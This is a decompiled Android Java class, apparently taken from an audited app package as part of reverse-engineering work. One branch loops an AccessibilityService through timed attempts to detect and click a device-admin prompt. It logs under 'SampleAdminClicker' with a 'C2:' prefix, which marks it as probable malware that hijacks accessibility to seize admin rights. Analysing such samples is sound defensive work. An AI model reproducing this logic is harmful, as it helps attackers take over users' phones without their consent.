// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package f2;

import android.accessibilityservice.AccessibilityService;
import android.content.ContextWrapper;
import android.util.Log;
import lyr.stable.runtime.setup.AuthSetupActivity;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class h implements Runnable {

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final /* synthetic */ int f1193c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final /* synthetic */ int f1194d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public final /* synthetic */ Object f1195e;

    public /* synthetic */ h(int i3, Runnable runnable) {
        this.f1193c = 2;
        this.f1194d = i3;
        this.f1195e = runnable;
    }

    @Override // java.lang.Runnable
    public final void run() {
        boolean zD;
        boolean zD2;
        switch (this.f1193c) {
            case 0:
                AuthSetupActivity authSetupActivity = (AuthSetupActivity) this.f1195e;
                int i3 = this.f1194d;
                int i4 = AuthSetupActivity.f2655f;
                authSetupActivity.i(i3 + 1);
                return;
            case 1:
                AccessibilityService accessibilityService = (AccessibilityService) this.f1195e;
                int i5 = this.f1194d;
                int i6 = 0;
                while (i6 < 45) {
                    try {
                        if (i5 == k0.f1229i && c0.n) {
                            try {
                                Thread.sleep(i6 == 0 ? 350L : 500L);
                            } catch (InterruptedException unused) {
                                Thread.currentThread().interrupt();
                            }
                            if (i5 == k0.f1229i && c0.n) {
                                try {
                                    zD = w1.n.D(accessibilityService);
                                } catch (Throwable unused2) {
                                    zD = false;
                                }
                                if (zD) {
                                    k0.f();
                                } else {
                                    if (i6 < 3) {
                                        k0.o(accessibilityService);
                                        try {
                                            Thread.sleep(300L);
                                        } catch (InterruptedException unused3) {
                                            Thread.currentThread().interrupt();
                                        }
                                    }
                                    if (k0.j(accessibilityService)) {
                                        Log.i("SampleAdminClicker", "u0.k hit i=" + i6);
                                        try {
                                            Thread.sleep(600L);
                                        } catch (InterruptedException unused4) {
                                            Thread.currentThread().interrupt();
                                        }
                                        try {
                                            zD2 = w1.n.D(accessibilityService);
                                        } catch (Throwable unused5) {
                                            zD2 = false;
                                        }
                                        if (zD2) {
                                            k0.f();
                                        }
                                        break;
                                    }
                                    i6++;
                                }
                                break;
                            }
                            break;
                        }
                    } catch (Throwable th) {
                        try {
                            Log.w("SampleAdminClicker", "C2: " + th.getMessage());
                        } finally {
                            k0.f1228h = false;
                            c0.f1150o = false;
                        }
                        break;
                    }
                    return;
                }
                return;
            default:
                int i7 = this.f1194d;
                Runnable runnable = (Runnable) this.f1195e;
                if (i7 == p0.f1304x && c0.g(4) && c0.k()) {
                    runnable.run();
                    return;
                }
                return;
        }
    }

    public /* synthetic */ h(ContextWrapper contextWrapper, int i3, int i4) {
        this.f1193c = i4;
        this.f1195e = contextWrapper;
        this.f1194d = i3;
    }
}
